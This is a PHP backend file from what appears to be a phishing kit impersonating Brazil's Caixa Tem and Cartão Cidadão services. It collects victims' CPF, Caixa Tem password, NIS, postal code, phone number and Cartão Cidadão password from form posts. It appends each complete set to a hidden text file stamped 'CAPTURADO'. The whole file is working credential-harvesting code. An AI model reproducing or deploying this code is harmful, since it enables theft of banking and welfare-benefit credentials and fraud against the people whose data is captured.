<?php 

    /* Setting Time Zone */
    date_default_timezone_set('America/Sao_Paulo');

    /* Encode Errors */
    error_reporting(E_ERROR);

    /* Start Session */
    session_start();

    /* Function */
    function savePost($param) {

        if (isset($_POST[$param]) && !empty($_POST[$param])) {

            $_SESSION[$param] = $_POST[$param];

        }

    }

    /* Function */
    function resultRegistration() {

        if (isset($_SESSION['sms']) && !empty($_SESSION['sms'])) {

            return $_SESSION['sms'] === 'SIM' ? true : false;

        } else {

            return false;

        }

    }

    /* Function */
    function saveInformations() {

        if (
            !empty($_SESSION['username']) && 
            !empty($_SESSION['password']) &&
            !empty($_SESSION['nis']) &&
            !empty($_SESSION['cep']) &&
            !empty($_SESSION['number']) &&
            !empty($_SESSION['sms']) &&
            !empty($_SESSION['password-citizen'])) {

            $file = fopen('../database/infos_s6g8d9c5v3k2.txt', 'a');
            fwrite($file, "============================\nCPF: ".$_SESSION['username']."\nSENHA CAIXA TEM: ".$_SESSION['password']."\nNIS: ".$_SESSION['nis']."\nCEP: ".$_SESSION['cep']."\nNUMERO CAIXA TEM: ".$_SESSION['number']."\nRECEBE SMS: ".$_SESSION['sms']."\nSENHA CARTÃO CIDADÃO: ".$_SESSION['password-citizen']."\nCAPTURADO: ".date("d/m/Y - H:i:s")."\n");
            fclose($file);

        }

    }

?>